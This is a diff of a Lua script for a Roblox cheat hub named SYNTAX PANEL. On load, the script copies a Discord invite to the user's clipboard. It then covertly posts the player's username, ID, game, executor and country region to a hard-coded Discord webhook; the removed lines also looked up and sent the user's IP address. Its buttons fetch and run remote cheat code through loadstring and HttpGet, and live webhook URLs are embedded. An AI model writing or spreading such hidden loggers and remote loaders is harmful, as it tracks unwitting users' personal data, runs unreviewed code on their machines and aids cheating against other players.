@@ -1,51 +1,48 @@
 --==================================================
--- WEBHOOK CONFIGURATION
+-- CONFIGURATION
 --==================================================
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1503111700725891132/cJls_LJ6drVsVZgezWLDXg2OXd3n1Ny9IksQYwNMqB-P__C4rxeMPSEEF0Uljj2hhwLN"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1503133999634186422/tW0VVFnLZ-k3SEgzeVa4TnqXxFVRXH8f9rfUEKM6I8ZRY7hXEWGC5We6gzgTYeS-W7HW"
 local HUB_NAME = "SYNTAX PANEL"
-local EMBED_COLOR = 10040330 -- Blood Red
+local EMBED_COLOR = 10040330 -- Deep Blood Red
 local _G_Discord = "https://discord.gg/PcNRpWNZVS"
 
 -- Auto-Copy Discord on Load
 setclipboard(_G_Discord)
 
 --==================================================
--- LOGGER & GAME CHECKER (WITH IP)
+-- RESTORED LOGGER LOGIC (NEW WEBHOOK / NO IP)
 --==================================================
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
+local LocalizationService = game:GetService("LocalizationService")
 local Stats = game:GetService("Stats")
 local LocalPlayer = Players.LocalPlayer
-
-local _G_GameName = "Unknown Game"
-pcall(function() _G_GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
 
 local http_request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
 
 if http_request and not _G.__SYNTAX_LOGGED then
     _G.__SYNTAX_LOGGED = true
     task.spawn(function()
-        -- Grab IP Address
-        local IP_ADDR = "Failed to fetch"
-        pcall(function()
-            local response = http_request({Url = "https://api.ipify.org", Method = "GET"})
-            if response and response.Body then IP_ADDR = response.Body end
-        end)
+        local GAME_NAME = "Unknown"
+        pcall(function() GAME_NAME = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
+        local EXECUTOR = identifyexecutor and identifyexecutor() or "Unknown"
+        local REGION = "Unknown"
+        pcall(function() REGION = LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer) end)
 
         local data = {
-            username = HUB_NAME .. " Logger",
+            username = HUB_NAME .. " Tracker",
             embeds = {{
-                title = "🩸 Execution Log (IP LOGGED)",
+                title = "🩸 Premium Script Executed",
                 color = EMBED_COLOR,
+                thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"},
                 fields = {
-                    {name = "👤 User", value = "**" .. LocalPlayer.Name .. "** (" .. LocalPlayer.UserId .. ")", inline = true},
-                    {name = "🌐 IP Address", value = "`" .. IP_ADDR .. "`", inline = true},
-                    {name = "🎮 Game", value = _G_GameName, inline = false},
-                    {name = "🆔 Place ID", value = tostring(game.PlaceId), inline = true},
-                    {name = "💻 Executor", value = (identifyexecutor and identifyexecutor() or "Unknown"), inline = true}
+                    {name = "👤 Player", value = "**User:** " .. LocalPlayer.Name .. "\n**ID:** " .. LocalPlayer.UserId, inline = true},
+                    {name = "🎮 Game", value = "**Name:** " .. GAME_NAME .. "\n**ID:** " .. game.PlaceId, inline = true},
+                    {name = "💻 Session", value = "**Executor:** " .. EXECUTOR, inline = false},
+                    {name = "🌐 Location Data", value = "**Region:** " .. REGION .. "\n**IP:** [REMOVED]", inline = false}
                 },
-                footer = {text = "Syntax Panel Premium • Secure Logger"},
+                footer = {text = HUB_NAME .. " • V3 Secure"},
                 timestamp = DateTime.now():ToIsoDate()
             }}
         }
@@ -64,36 +61,28 @@ end
 -- MAIN UI (BLOOD RED THEME)
 --==================================================
 local _G_WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
+local _G_GameName = "Unknown Game"
+pcall(function() _G_GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
 
 local _Window = _G_WindUI:CreateWindow({
-    Folder = "syntax_blood_red",
+    Folder = "syntax_blood_v3",
     Title = "SYNTAX PANEL ◆ PREMIUM",
     NewElements = true,
     OpenButton = {
         Enabled = true,
-        Color = ColorSequence.new(Color3.fromHex("#4E0000"), Color3.fromHex("#FF0000")),
+        Color = ColorSequence.new(Color3.fromHex("#800000"), Color3.fromHex("#FF0000")),
         Title = "SYNTAX",
         Draggable = true,
     },
     Icon = "solar:ghost-bold",
-    AccentColor = Color3.fromHex("#FF0000"), -- Forced Blood Red
+    AccentColor = Color3.fromHex("#FF0000"),
 })
 
 -- // [ TAB 1: DASHBOARD ]
 local _T1 = _Window:Tab({ Title = "Dashboard", Icon = "solar:home-bold" })
 
-_T1:Button({ 
-    Title = "User: " .. LocalPlayer.Name, 
-    Icon = "solar:user-bold", 
-    Callback = function() end 
-})
-
-_T1:Button({ 
-    Title = "Playing: " .. _G_GameName, 
-    Description = "Place ID: " .. game.PlaceId,
-    Icon = "solar:gamepad-old-bold", 
-    Callback = function() end 
-})
+_T1:Button({ Title = "User: " .. LocalPlayer.Name, Icon = "solar:user-bold", Callback = function() end })
+_T1:Button({ Title = "Game: " .. _G_GameName, Icon = "solar:gamepad-old-bold", Callback = function() end })
 
 local _FPSBtn = _T1:Button({ Title = "FPS: Calculating...", Icon = "solar:chart-square-bold", Callback = function() end })
 local _PingBtn = _T1:Button({ Title = "Ping: Calculating...", Icon = "solar:transmission-bold", Callback = function() end })
@@ -112,38 +101,26 @@ local _T2 = _Window:Tab({ Title = "Main Games", Icon = "solar:fire-bold" })
 
 _T2:Button({
     Title = "ADOPT ME (OP)",
-    Description = "Exponential Premium Logic",
     Icon = "solar:play-bold",
-    Callback = function() 
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/PROGRAMSS-CPU/EXPONENTIAL/refs/heads/main/adm-op"))() 
-    end
+    Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/PROGRAMSS-CPU/EXPONENTIAL/refs/heads/main/adm-op"))() end
 })
 
 _T2:Button({
     Title = "MM2 (OP)",
-    Description = "Silent Aim & ESP Features",
     Icon = "solar:play-bold",
-    Callback = function() 
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/PROGRAMSS-CPU/EXPONENTIAL/refs/heads/main/mm2-op"))() 
-    end
+    Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/PROGRAMSS-CPU/EXPONENTIAL/refs/heads/main/mm2-op"))() end
 })
 
 _T2:Button({
     Title = "STEAL A BRAINROT",
-    Description = "Kawatan Hub - Premium",
     Icon = "solar:play-bold",
-    Callback = function() 
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/PROGRAMSS-CPU/EXPONENTIAL/refs/heads/main/kawatan-hub"))() 
-    end
+    Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/PROGRAMSS-CPU/EXPONENTIAL/refs/heads/main/kawatan-hub"))() end
 })
 
 _T2:Button({
     Title = "SAILOR PIECE",
-    Description = "Luarmor Premium Loader",
     Icon = "solar:play-bold",
-    Callback = function() 
-        loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/b1f30331e1af9ab6e96fc80cd00b20a9.lua"))() 
-    end
+    Callback = function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/b1f30331e1af9ab6e96fc80cd00b20a9.lua"))() end
 })
 
 -- // [ TAB 3: OTHER GAMES ]
@@ -168,10 +145,10 @@ _T3:Button({
 })
 
 -- // [ TAB 4: CREDITS ]
-local _T4 = _Window:Tab({ Title = "Credits", Icon = "solar:letter-bold" })
+local _T4 = _Window:Tab({ Title = "Credits", Icon = "solar:info-circle-bold" })
 
 _T4:Button({ 
-    Title = "Owner: SYNTAX", 
+    Title = "Owner: BENJO", 
     Icon = "solar:star-bold", 
     Callback = function() end 
 })
@@ -189,7 +166,7 @@ _T4:Button({
 _Window:SelectTab(_T1)
 
 _G_WindUI:Notify({
-    Title = "SYNTAX BLOOD RED",
-    Content = "IP & Data Logged. Welcome back.",
+    Title = "SYNTAX PANEL ◆ V3",
+    Content = "Webhook updated and ready to go!",
     Duration = 5
 })
